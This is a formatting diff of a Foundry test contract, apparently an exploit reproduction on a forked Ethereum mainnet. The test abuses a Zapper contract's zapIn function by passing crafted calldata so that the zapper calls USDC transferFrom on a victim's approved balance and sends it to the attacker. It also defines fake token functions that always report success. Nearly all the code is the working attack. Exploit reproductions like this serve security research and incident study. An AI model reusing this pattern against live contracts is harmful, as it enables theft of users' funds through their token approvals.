@@ -16,10 +16,11 @@ interface Zapper {
         address swapTarget;
         bytes callData;
     }
+
     function zapIn(ZapData calldata zapCall) external;
 }
 
-contract ContractTest is DSTest{
+contract ContractTest is DSTest {
     Zapper zappper = Zapper(0xD248B30A3207A766d318C7A87F5Cf334A439446D);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
@@ -30,19 +31,20 @@ contract ContractTest is DSTest{
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 15933794);
+        cheats.createSelectFork("mainnet", 15_933_794);
     }
 
-    function testExploit() public{
+    function testExploit() public {
         address(WETH).call{value: 1e15}("");
         WETHToFRAX();
-        uint balance = USDC.balanceOf(victimAddress);
-        uint allowance = USDC.allowance(victimAddress, address(zappper));
-        uint amount = balance;
-        if(balance > allowance){
+        uint256 balance = USDC.balanceOf(victimAddress);
+        uint256 allowance = USDC.allowance(victimAddress, address(zappper));
+        uint256 amount = balance;
+        if (balance > allowance) {
             amount = allowance;
         }
-        bytes memory data = abi.encodeWithSignature("transferFrom(address,address,uint256)", victimAddress, address(this), amount);
+        bytes memory data =
+            abi.encodeWithSignature("transferFrom(address,address,uint256)", victimAddress, address(this), amount);
         Zapper.ZapData memory zapData = Zapper.ZapData({
             requiredToken: address(this),
             amountIn: 1,
@@ -50,46 +52,32 @@ contract ContractTest is DSTest{
             allowanceTarget: address(this),
             swapTarget: address(USDC),
             callData: data
-
         });
         zappper.zapIn(zapData);
 
-        emit log_named_decimal_uint(
-            "[End] Attacker USDC balance after exploit",
-            USDC.balanceOf(address(this)),
-            6
-        );
+        emit log_named_decimal_uint("[End] Attacker USDC balance after exploit", USDC.balanceOf(address(this)), 6);
     }
 
-    function WETHToFRAX() internal{
-        WETH.approve(address(Router), type(uint).max);
-        address [] memory path = new address[](2);
+    function WETHToFRAX() internal {
+        WETH.approve(address(Router), type(uint256).max);
+        address[] memory path = new address[](2);
         path[0] = address(WETH);
         path[1] = address(FRAX);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WETH.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            WETH.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
 
-    function transferFrom(
-        address sender,
-        address recipient,
-        uint amount
-    ) external returns (bool) {
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
         return true;
     }
 
-    function balanceOf(address account) external view returns (uint) {
+    function balanceOf(address account) external view returns (uint256) {
         return 1;
     }
 
-    function approve(address spender, uint amount) external returns (bool) {
-       FRAX.transfer(address(zappper), 10);
+    function approve(address spender, uint256 amount) external returns (bool) {
+        FRAX.transfer(address(zappper), 10);
         return true;
     }
-
 }
